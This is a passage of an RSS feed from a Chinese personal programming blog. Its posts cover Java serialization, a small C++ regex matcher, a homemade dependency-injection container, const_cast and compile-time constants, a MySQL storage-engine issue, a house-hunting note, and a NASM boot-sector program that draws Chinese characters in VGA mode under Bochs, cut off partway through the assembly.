<P align=left>要记住一点，如果一个类是可外部化的（Externalizable），那么Externalizable方法将被用于序列化类的实例，即使这个类型提供了Serializable方法：</P>
<P align=left>private void writeObject()<BR>private void readObject()</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2SE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200782782613782/</guid>
    </item>
    <item>
      <title>
<![CDATA[漂亮精悍的正则表达式]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720109633339362/</link>
      <description>
<![CDATA[来自&lt;&lt;代码之美&gt;&gt;<br>只支持^$.*三种符号<br><br>include &lt;iostream&gt;<br>#include &lt;algorithm&gt;<br>using namespace std;<br><br>int matchstar(char *text, char *exp, int c); <br>int matchhere(char *text, char *exp);<br>int search(char *text, char *exp);<br><br>int main(){<br>&nbsp;&nbsp;&nbsp; char text[]="hello, joke";<br>&nbsp;&nbsp;&nbsp; char exp[]="^hell.";<br>&nbsp;&nbsp;&nbsp; cout&lt;&lt;search(text, exp)&lt;&lt;endl;<br>&nbsp;&nbsp;&nbsp; return 0;<br>}<br><br>int matchstar(char *text, char *exp, int c){ <br>&nbsp;&nbsp;&nbsp; do{ <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(matchhere(text,exp)&gt;0)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 1;<br>&nbsp;&nbsp;&nbsp; }while(*text++==c || c=='.');<br>&nbsp;&nbsp;&nbsp; return 0;<br>}<br>int matchhere(char *text, char *exp){<br>&nbsp;&nbsp;&nbsp; if(*exp=='\0')<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 1;<br>&nbsp;&nbsp;&nbsp; if(*exp=='$' &amp;&amp; *(exp+1)=='\0')<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return *text=='\0';<br>&nbsp;&nbsp;&nbsp; if(*(exp+1)=='*')<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return matchstar(text, exp+2, *exp);<br>&nbsp;&nbsp;&nbsp; if(*text==*exp || *exp=='.')<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return matchhere(text+1, exp+1);<br>&nbsp;&nbsp;&nbsp; return 0;<br>}<br>int search(char *text, char *exp){<br>&nbsp;&nbsp;&nbsp; if(*exp == '^')<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return matchhere(text, exp+1);<br>&nbsp;&nbsp;&nbsp; do{ <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(matchhere(text, exp))<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 1;<br>&nbsp;&nbsp;&nbsp; }while(*text++ != '\0');<br>&nbsp;&nbsp;&nbsp; return 0;<br>}]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720109633339362/</guid>
    </item>
    <item>
      <title>
<![CDATA[IOC - Google Guice]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372008513572299/</link>
      <description>
<![CDATA[google的反射框架Google Guice，传说adsense就是用的这个，和Spring相比，不用xml配置文件，类库只有500K，运行速度比Spring好几十倍。<br>作了一个Hello World的试验，平均运行时间313<br>然后抛开Guice，自己实现了以下功能，平均运行时间13<br>把自己实现的这个代码贴上来，一共四个程序，一个接口，一个实现，一个IOC框架类，一个测试类<br>/**<br>&nbsp;* IPrint.java<br>&nbsp;* @author hankjin<br>&nbsp;*/<br>public interface IPrint {<br>&nbsp;&nbsp;&nbsp; void print(String s);<br>}<br>/**<br>&nbsp;* PrintImpl.java<br>&nbsp;* @author hankjin<br>&nbsp;*/<br>public class PrintImpl implements IPrint {<br>&nbsp;&nbsp;&nbsp; public void print(String s) {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; System.out.println(s);<br>&nbsp;&nbsp;&nbsp; }<br>}<br>/**<br>&nbsp;* Client.java<br>&nbsp;* @author hankjin<br>&nbsp;*/<br>public class Client {<br>&nbsp;&nbsp;&nbsp; IPrint print;<br>&nbsp;&nbsp;&nbsp; String str = "Hello, worlp";<br>&nbsp;&nbsp;&nbsp; public void test(){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; print.print(str);<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; public void inject(IPrint print){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; this.print = print;<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; public static void main(String args[]) throws Exception{<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; long start = System.currentTimeMillis();<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; IOC.bind(IPrint.class, PrintImpl.class);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; Client client = new Client();<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; IOC.injectMembers(client);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; client.test();<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; long end = System.currentTimeMillis();<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; System.out.println(end-start);<br>&nbsp;&nbsp;&nbsp; }<br>}<br>import java.lang.reflect.Method;<br>import java.util.Hashtable;<br>import java.util.Set;<br>/**<br>&nbsp;* IOC.java<br>&nbsp;* @author hankjin<br>&nbsp;*/<br>public class IOC {<br>&nbsp;&nbsp;&nbsp; static Hashtable &lt;Class, Class&gt; data = new Hashtable&lt;Class, Class&gt;();<br>&nbsp;&nbsp;&nbsp; static void bind(Class i, Class o){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; data.put(i, o);<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; static void injectMembers(Object o) throws Exception{<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; Method[] oms = o.getClass().getMethods();<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; for(Method om: oms){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if("inject".equals(om.getName())){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; Class omp = om.getParameterTypes()[0];<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; Set&lt;Class&gt; keys = data.keySet();<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; for(Class service: keys){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if(service.equals(omp)){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; om.invoke(o, data.get(service).newInstance());<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return ;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; System.err.println("No data find");<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; System.err.println("No methods");<br>&nbsp;&nbsp;&nbsp; }<br>}<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2SE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372008513572299/</guid>
    </item>
    <item>
      <title>
<![CDATA[神奇的const_cast]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201010632318891/</link>
      <description>
<![CDATA[#include &lt;stdio.h&gt;<br>int main(){<br>&nbsp;&nbsp;&nbsp; const int i=99;<br>&nbsp;&nbsp;&nbsp; int *j = const_cast&lt;int*&gt;(&amp;i);<br>&nbsp;&nbsp;&nbsp; *j=4;<br>&nbsp;&nbsp;&nbsp; printf("%d %d\n",i,*j);<br>&nbsp;&nbsp;&nbsp; return 0;<br>}<br>输出是99 4，这个结果很奇怪，用gdb进行跟踪调试，在printf的地方设置断点，并用print命令输出，发现i,*j都是4，这个是比较符合实际情况的，但为什么输出为99 4呢？<br><br>用objdump进行测试<br>objdump -d test<br>&nbsp;8048630:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; c7 44 24 04 63 00 00&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x63,0x4(%esp)<br>&nbsp;8048637:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 00<br>&nbsp;8048638:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; c7 04 24 20 87 04 08&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x8048720,(%esp)<br>&nbsp;804863f:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; e8 8c fe ff ff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; 80484d0 &lt;printf@plt&gt;<br>可以看到8048630的代码 movl $0x63, 0x4(%esp)，就是将0x63压栈，也就是99。<br><b>编译时替换</b><br>现在明白了，编译器将const变量在编译的时候直接替换为值，所以编译后的代码为<br>printf("%d %d\n", 99, *j);<br>所以会出现这种不可思议的结果。<br>这种技术叫做编译时替换，就是在编译时将一些常量变量替换为立即数，这样避免了寻址操作，对代码的优化是很好的，但是有可能会导致const_cast出现难以理解的异常。]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201010632318891/</guid>
    </item>
    <item>
      <title>
<![CDATA[回龙观找房有感]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720078585727491/</link>
      <description>
<![CDATA[<P>今天终于确认实习了，过几天等中智把体检单发过来，然后在大连体检结束就可以过去了，开始找房，老四说一般都在回龙观住，给了我个网址。<A rel="nofollow" href="http://sales.hlgnet.com/"  >http://sales.hlgnet.com/</A>。</P>  <P>然后就看着烟花缭乱的招租信息，最后挑了5个，然后就想怎么把中介过滤出来呢。突然发现有每个招租信息发布人都有电话，可以搜索这个电话的所有招租信息。呵呵，OK，发现有3个招租信息的发布者都发布了几十条招租信息，直接滤掉。</P>  <P>继续等待。。。。</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Mood</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720078585727491/</guid>
    </item>
    <item>
      <title>
<![CDATA[Mysql5.1.47数据丢失]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372010525048193/</link>
      <description>
<![CDATA[MySQL 官方网站下载非常麻烦，所以就从天空软件站下载了Mysql5.1.47<br>http://www.skycn.com/soft/1262.html#downUrlMap<br>全部默认安装后，发现一个很大的问题<br>create database hankjin;<br>use hankjin;<br>create table test(id int);<br>然后使用MySQLdb访问，插入数据，检索数据成功，然后退出，进入mysql命令行，发现数据并没有插入！！<br>后来检查my.ini，发现默认存储引擎是innodb，因此在创建数据表时指定myisam方式即可：<br>create table test(id int) type myisam;<br>应该是mysqldb的问题。]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>DataBase</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372010525048193/</guid>
    </item>
    <item>
      <title>
<![CDATA[用汇编在系统加载时显示汉字]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200911192325600/</link>
      <description>
<![CDATA[在系统加载区显示汉字：<br>1. 编译asm成二进制文件bin<br>2. 用build.exe(由build.c编译生成)将bin文件写到img文件的前512字节处<br>3. 运行bochs<br>nasm hanzi.asm -o hanzi.bin <br>bcc32 build.c<br>build.exe hanzi.bin hanzi.img<br>bochs&nbsp; -f hanzi.bxrc<br><br>======================hanzi.bxrc==============================<br>megs: 32<br>romimage: file="../../bochs/BIOS-bochs-latest"<br>vgaromimage: file="../../bochs/VGABIOS-elpin-2.40"<br>floppya: 1_44=hanzi.img, status=inserted<br>boot: a<br>log: bochsout.txt<br>mouse: enabled=0<br>keyboard_mapping: enabled=1, map="../../bochs/keymaps/x11-pc-us.map"<br>======================build.c==============================<br>#include &lt;stdio.h&gt;<br>int main(int argc, char *argv[]){<br>&nbsp;&nbsp;&nbsp; FILE *filp, *boot;<br>&nbsp;&nbsp;&nbsp; char buff[512];<br>&nbsp;&nbsp;&nbsp; size_t c, bootsize = 0, imgsize=80*18*512*2;<br>&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; if(argc != 3){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; printf("Usage: %s &lt;img&gt; &lt;bin&gt;\n", argv[0]);<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; filp = fopen(argv[1],"wb");<br>&nbsp;&nbsp;&nbsp; boot = fopen(argv[2],"rb");<br>&nbsp;&nbsp;&nbsp; while((c=fread(buff, sizeof(char), sizeof(buff),boot)) &gt; 0){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; fwrite(buff,sizeof(char),c,filp);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; bootsize += c;<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; fclose(boot);<br>&nbsp;&nbsp;&nbsp; while(bootsize &lt; imgsize){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; fwrite(buff,sizeof(char),sizeof(buff),filp);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; bootsize+=sizeof(buff);<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; fclose(filp);<br>&nbsp;&nbsp;&nbsp; return 0;<br>}<br><br>======================hanzi.asm==============================<br>;<br>ROW equ 5<br>COLUM equ 10<br>ESCKEY equ 1Bh<br>STRINGAD equ 100h<br>STRINGL equ 1ch<br>COLORAD equ STRINGAD+20h<br>COLOR equ 7<br>vgaseg equ 0a000h<br>sequen_ctl equ 34ch<br>graphi_ctl equ 3ceh<br><br>[section .s16]<br>[BITS 16]<br>&nbsp;&nbsp; start:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;Normal function<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;清屏<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp; ax,07c0h<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp; ds,ax<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp; es,ax<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp; cx,0<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp; dx,184Fh<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp; bh,07<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp; ax,600h<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp; 10h<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;设置堆栈段<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov ax,0f00h<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov ss,ax&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov sp,100h<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;进入640×480×16色模式<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;setmode:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;对640*480*16和320*200*256是标准VGA模式，在各种VGA上都分别为12h和13h<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov ax, 12h<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int 10h<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;准备调用DispZhC过程<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov si, chineseS<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov ax,0<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov bx,0<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov cx,060Eh<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;call writePix<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;call DispZhC<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call DispZhS&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp; stop: nop<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp stop<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>;在图形模式下显示指定长度的字符串<br>;输入参数：<br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ds:si&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 字符串点阵缓冲区的首地址<br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ax=y0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 字符串第一个字符左上角的Y坐标<br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bx=x0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 字符串第一个字符左上角的X坐标<br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ch=n<br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cl=color<br>;返回值：无<br>DefDis equ 5&nbsp;&nbsp; ;每两个符号间的默认间距为5个像素<br>CharWidth equ 16 ;默认为16点阵，这也是每个字符的像素宽度<br>DispZhS:<br>&nbsp;&nbsp; push bp<br>&nbsp;&nbsp; push ax<br>&nbsp;&nbsp; push bx<br>&nbsp;&nbsp; push ds<br>&nbsp;&nbsp; push si<br>&nbsp;&nbsp; push cx<br>&nbsp;&nbsp; push dx<br>&nbsp;&nbsp; mov bp,sp<br>&nbsp;&nbsp; xor dx,dx<br>&nbsp;&nbsp; jmp s1<br>&nbsp;nextChar:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;指向下一个要输出的字符<br>&nbsp;&nbsp;&nbsp; add si,32<br>&nbsp;&nbsp;&nbsp; add bx,DefDis+CharWidth<br>&nbsp;s1:<br>&nbsp;&nbsp;&nbsp; cmp dh,ch&nbsp;&nbsp;&nbsp; ;是否已经输出了指定个数的字符<br>&nbsp;&nbsp;&nbsp; je&nbsp; Dones<br>&nbsp;&nbsp;&nbsp; call DispZhC<br>&nbsp;&nbsp;&nbsp; inc dh<br>&nbsp;&nbsp;&nbsp; jmp nextChar<br>&nbsp;Dones:<br>&nbsp;&nbsp; pop dx&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp; pop cx&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp; pop si&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp; pop ds&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp; pop bx&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp; pop ax&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp; pop bp&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp; ret<br><br>&nbsp;&nbsp; ;;进入640×480×16色模式<br>&nbsp;&nbsp; ;setmode:<br>&nbsp;&nbsp; ;;对640*480*16和320*200*256是标准VGA模式，在各种VGA上都分别为12h和13h<br>&nbsp;&nbsp; ;mov ax, 4fh<br>&nbsp;&nbsp; ;mov al,2h<br>&nbsp;&nbsp; ;mov bx,102h<br>&nbsp;&nbsp; ;int 10h<br><br><br><br>;在图形模式下显示一个汉字<br>;输入参数：<br>;&nbsp; BX=x0 初始左上角X坐标<br>;&nbsp; AX=y0 初始左上角Y坐标<br>;&nbsp; CX=color&nbsp; 其实只是cl表示颜色<br>;&nbsp; ds:si=buff 字符点阵信息首地址<br>;返回值：无<br>DispZhC:<br>&nbsp;&nbsp; push si<br>&nbsp;&nbsp; push bp<br>&nbsp;&nbsp; push ax <br>&nbsp;&nbsp; push bx<br>&nbsp;&nbsp; push cx<br>&nbsp;&nbsp; push dx <br>&nbsp;&nbsp; mov bp,sp<br>&nbsp;&nbsp; xor dx,dx&nbsp;&nbsp;&nbsp;&nbsp; ;dx 当前行<br>&nbsp;&nbsp; jmp a1<br>Disp:<br>&nbsp;&nbsp; inc si<br>&nbsp;&nbsp; inc si&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;指向下一个字<br>&nbsp;&nbsp; inc dx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;行记数加一<br>a1:<br>&nbsp;&nbsp; cmp dx,16&nbsp;&nbsp;&nbsp;&nbsp; ;当前行为0-15，因为是16*16点阵<br>&nbsp;&nbsp; je&nbsp; Done<br>&nbsp;&nbsp; xor cx,cx&nbsp;&nbsp;&nbsp;&nbsp; ;cx 当前列初始化<br>&nbsp;&nbsp; mov word bx, [si]&nbsp;&nbsp;&nbsp;&nbsp; ;读入一行的点阵信息，一行两个字节表示<br>DispL:<br>&nbsp;&nbsp; cmp cx,16<br>&nbsp;&nbsp; je&nbsp; Disp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;换行&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp; or&nbsp; cx,cx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;清零CF<br>&nbsp;&nbsp; shl bx,1<br>&nbsp;&nbsp; jc&nbsp; DispP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;如果当前位是1，显示一个点<br>&nbsp;&nbsp; inc cx<br>&nbsp;&nbsp; jmp DispL<br>DispP:<br>&nbsp;&nbsp; push ax<br>&nbsp;&nbsp; push bx<br>&nbsp;&nbsp; push cx<br>&nbsp;&nbsp; mov ax,[bp+6]<br>&nbsp;&nbsp; add ax,dx<br>&nbsp;&nbsp; mov bx,[bp+4]<br>&nbsp;&nbsp; add bx,cx<br>&nbsp;&nbsp; mov cx,[bp+2]&nbsp; ;颜色值在cl中<br>&nbsp;&nbsp; call writePix<br>&nbsp;&nbsp; pop cx<br>&nbsp;&nbsp; inc cx<br>&nbsp;&nbsp; pop bx<br>&nbsp;&nbsp; pop ax<br>&nbsp;&nbsp; jmp DispL<br>Done:<br>&nbsp;&nbsp; pop dx<br>&nbsp;&nbsp; pop cx<br>&nbsp;&nbsp; pop bx<br>&nbsp;&nbsp; pop ax<br>&nbsp;&nbsp; pop bp<br>&nbsp;&nbsp; pop si<br>&nbsp;&nbsp; ret<br><br><br><br>;功能：<br>;&nbsp;&nbsp;&nbsp;&nbsp; 在指定的屏幕位置用指定的颜色画一个点<br>;入口参数：<br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bx = x0&nbsp;&nbsp;&nbsp;&nbsp; 象素在屏幕上的X坐标<br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ax = y0&nbsp;&nbsp;&nbsp;&nbsp; 象素在屏幕上的Y坐标<br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cl = color&nbsp; 象素的颜色值<br>linelen equ 80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;640*480*16色模式下一条扫描线占用的字节数=Width/8<br>writePix:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;计算象素点的位置 <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push es<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push bp<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push dx<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push ax<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push di<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push cx<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push bx<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov bp,sp<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov cl,3<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; shr bx,cl&nbsp;&nbsp;&nbsp; ;X0/8<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov cx,linelen<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mul cx<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; add ax,bx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;至此ax中为像素点的偏移，dx为页号<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov di,ax<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 